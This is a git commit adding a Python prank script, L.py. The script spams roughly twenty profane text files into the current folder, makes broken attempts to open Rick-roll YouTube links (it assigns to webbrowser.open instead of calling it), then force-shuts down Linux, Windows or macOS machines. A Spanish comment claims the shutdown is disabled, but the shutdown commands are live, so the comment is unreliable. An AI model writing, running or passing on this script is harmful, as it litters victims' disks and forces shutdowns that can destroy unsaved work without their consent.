c6256d32f6f5e013b5d0bcb4a6f0fcdb3fbb2577
Biohazard <84819214+qu3tiiii@users.noreply.github.com>
2021-08-11 17:18:52 -0400

    Create L.py

---
+++ L.py
@@ -0,0 +1,75 @@
+import os 
+import platform 
+import time
+import webbrowser as qti
+arch=open("DATTITOOOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOOOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOOOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOOOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOOOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOeOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOrOOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOfOOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOaOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOqOsOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITeOOOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOqOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOeqOOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOeOO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOOOqO.txt", "a")
+arch.write("FUCKED LOL")
+arch=open("DATTITOOaO.txt", "a")
+arch.write("FUCKED LOL")
+
+qti.open='https://www.youtube.com/watch?v=dQw4w9WgXcQ'
+qti.open='https://www.youtube.com/watch?v=dQw4w9WgXcQ'
+qti.open='https://www.youtube.com/watch?v=dQw4w9WgXcQ'
+qti.open='https://www.youtube.com/watch?v=dQw4w9WgXcQ'
+qti.open='https://www.youtube.com/watch?v=dQw4w9WgXcQ'
+qti.open='https://www.youtube.com/watch?v=48rz8udZBmQ'
+qti.open='https://www.youtube.com/watch?v=48rz8udZBmQ'
+qti.open='https://www.youtube.com/watch?v=48rz8udZBmQ'
+qti.open='https://www.youtube.com/watch?v=48rz8udZBmQ'
+qti.open='https://www.youtube.com/watch?v=48rz8udZBmQ'
+qti.open='https://www.youtube.com/watch?v=48rz8udZBmQ'
+#Spamea el code cambiando el nombre de los archivos y las palabras!
+time.sleep(10)
+
+OpSy = platform.system() 
+
+
+
+
+if OpSy == 'Linux': 
+  os.system('sudo shutdown now') 
+if OpSy == 'Windows': 
+  os.system('shutdown -s') 
+if OpSy == 'Darwin': 
+  os.system('sudo shutdown -h now') 
+#Para apagar pc desactivado
